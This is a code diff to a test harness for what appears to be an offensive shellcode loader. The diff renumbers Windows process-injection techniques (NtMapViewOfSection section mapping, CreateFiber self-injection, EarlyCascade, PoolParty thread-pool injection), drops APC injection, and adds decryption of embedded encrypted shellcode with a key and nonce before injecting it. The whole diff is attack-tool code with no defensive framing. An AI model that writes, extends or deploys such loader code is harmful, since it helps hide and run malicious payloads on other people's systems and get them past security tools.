@@ -3,11 +3,10 @@
  * @brief Test specific injection methods
  * 
  * Build with different CONFIG_INJECTION_TYPE values:
- *   make test-injection BUILD=debug INJECTION_TYPE=1  # NtQueueApcThread
- *   make test-injection BUILD=debug INJECTION_TYPE=2  # NtMapViewOfSection
- *   make test-injection BUILD=debug INJECTION_TYPE=3  # CreateFiber
- *   make test-injection BUILD=debug INJECTION_TYPE=4  # EarlyCascade
- *   make test-injection BUILD=debug INJECTION_TYPE=5  # PoolParty
+ *   make test-injection BUILD=debug INJECTION_TYPE=1  # NtMapViewOfSection
+ *   make test-injection BUILD=debug INJECTION_TYPE=2  # CreateFiber
+ *   make test-injection BUILD=debug INJECTION_TYPE=3  # EarlyCascade
+ *   make test-injection BUILD=debug INJECTION_TYPE=4  # PoolParty
  */
 
 #include <cstdio>
@@ -22,6 +21,7 @@
 
 #include "../include/loader.hpp"
 #include "../include/shellcode.hpp"
+#include "../include/shellcode_optional.hpp"
 
 // ============================================
 // COLOR HELPERS
@@ -47,14 +47,12 @@
 
 const char* GetInjectionMethodName() {
 #if CONFIG_INJECTION_TYPE == 1
-    return "NtQueueApcThread (APC Injection)";
-#elif CONFIG_INJECTION_TYPE == 2
     return "NtMapViewOfSection (Section Mapping)";
-#elif CONFIG_INJECTION_TYPE == 3
+#elif CONFIG_INJECTION_TYPE == 2
     return "CreateFiber (Fiber-based Self-Injection)";
-#elif CONFIG_INJECTION_TYPE == 4
+#elif CONFIG_INJECTION_TYPE == 3
     return "EarlyCascade (Early Bird APC)";
-#elif CONFIG_INJECTION_TYPE == 5
+#elif CONFIG_INJECTION_TYPE == 4
     return "PoolParty (Worker Factory Thread Pool)";
 #else
     return "Unknown";
@@ -140,9 +138,19 @@ int main(int argc, char* argv[]) {
     }
     RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);
     
-    // Process shellcode (decrypt/decompress)
+    // Process shellcode (decrypt/decompress) using embedded key from shellcrypt
     PRINT_INFO("Processing shellcode (decrypt/decompress)...");
-    erebus::DecryptShellcode(&shellcode_ptr, &shellcode_size);
+
+    BYTE* iv = nullptr;
+    SIZE_T iv_len = 0;
+    #if CONFIG_ENCRYPTION_TYPE == 4
+    if (ShellcodeHasNonce()) {
+        iv = nonce;
+        iv_len = 16;
+    }
+    #endif
+
+    erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key, sizeof(key), iv, iv_len);
     erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
     
     if (shellcode_ptr == NULL || shellcode_size == 0) {
